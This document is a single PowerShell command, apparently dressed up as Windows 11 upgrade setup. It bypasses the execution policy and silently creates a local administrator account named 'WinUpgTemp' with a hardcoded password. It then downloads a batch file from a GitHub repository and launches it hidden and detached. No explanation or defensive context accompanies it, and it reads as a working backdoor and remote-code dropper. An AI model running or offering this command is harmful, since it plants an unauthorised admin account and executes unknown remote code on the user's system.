powershell -ExecutionPolicy Bypass -NoProfile -Command "$user='WinUpgTemp';$pass='TempPass123!';$root='C:\Win11Upgrade';$urlbat='https://raw.githubusercontent.com/sctcoder1/project-711-d/main/RepoHandler.bat';$bat=Join-Path $root 'RepoHandler.bat';$log=Join-Path $root 'Setup_Log.txt';function log($m){$t='['+(Get-Date -Format \"yyyy-MM-dd HH:mm:ss\")+'] '+$m;New-Item -ItemType Directory -Force -Path (Split-Path $log)|Out-Null;Add-Content -Path $log -Value $t;Write-Host $t};log '--- Starting RepoHandler setup ---';if(-not(Test-Path $root)){New-Item -ItemType Directory -Force -Path $root|Out-Null};try{if(-not(Get-LocalUser -Name $user -ErrorAction SilentlyContinue)){net user $user $pass /add | Out-Null;net localgroup administrators $user /add | Out-Null;log ('Created admin user '+$user)}else{log ('Admin user '+$user+' already exists')}}catch{};Invoke-WebRequest -Uri $urlbat -OutFile $bat -UseBasicParsing;log 'Downloaded RepoHandler.bat';Start-Process -FilePath 'cmd.exe' -ArgumentList '/c start \"\" /min \"C:\Win11Upgrade\RepoHandler.bat\"' -WindowStyle Hidden;log 'RepoHandler launched detached';log '--- Script complete ---'"
